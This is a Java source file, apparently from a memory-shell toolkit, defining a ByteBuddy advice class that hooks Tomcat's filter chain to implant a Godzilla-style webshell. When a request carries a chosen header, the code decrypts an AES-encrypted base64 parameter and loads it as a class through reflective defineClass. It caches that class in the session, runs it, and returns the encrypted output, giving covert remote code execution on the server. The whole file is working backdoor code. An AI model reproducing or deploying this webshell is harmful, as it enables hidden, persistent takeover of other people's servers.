package com.reajason.javaweb.memshell.tomcat.godzilla;

import net.bytebuddy.asm.Advice;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;

/**
 * @author ReaJason
 */
public class TomcatFilterChainGodzillaAdvisor {
    public static String key;
    public static String pass;
    public static String md5;
    public static String headerName;
    public static String headerValue;

    @Advice.OnMethodEnter(skipOn = Advice.OnNonDefaultValue.class)
    public static boolean enter(
            @Advice.Argument(value = 0) ServletRequest req,
            @Advice.Argument(value = 1) ServletResponse res
    ) {
        if (!(req instanceof HttpServletRequest)) {
            return false;
        }
        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;
        try {
            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
                HttpSession session = request.getSession();
                String parameter = request.getParameter(pass);
                byte[] data = null;
                Class<?> base64;
                try {
                    base64 = Class.forName("java.util.Base64");
                    Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
                    data = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, parameter);
                } catch (Exception var6) {
                    base64 = Class.forName("sun.misc.BASE64Decoder");
                    Object decoder = base64.newInstance();
                    data = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, parameter);
                }
                Cipher c = Cipher.getInstance("AES");
                SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(), "AES");
                c.init(2, keySpec);
                data = c.doFinal(data);
                if (session.getAttribute("payload") == null) {
                    Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    defineClass.setAccessible(true);
                    Class<?> payload = (Class<?>) defineClass.invoke(Thread.currentThread().getContextClassLoader(), data, 0, data.length);
                    session.setAttribute("payload", payload);
                } else {
                    request.setAttribute("parameters", data);
                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                    Object f = ((Class<?>) session.getAttribute("payload")).newInstance();
                    f.equals(arrOut);
                    f.equals(request);
                    response.getWriter().write(md5.substring(0, 16));
                    f.toString();

                    c.init(1, keySpec);
                    byte[] encryptBytes = c.doFinal(arrOut.toByteArray());
                    String value = null;
                    try {
                        base64 = Class.forName("java.util.Base64");
                        Object encoder = base64.getMethod("getEncoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
                        value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, encryptBytes);
                    } catch (Exception var6) {
                        base64 = Class.forName("sun.misc.BASE64Encoder");
                        Object encoder = base64.newInstance();
                        value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, encryptBytes);
                    }
                    response.getWriter().write(value);
                    response.getWriter().write(md5.substring(16));
                }
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }
}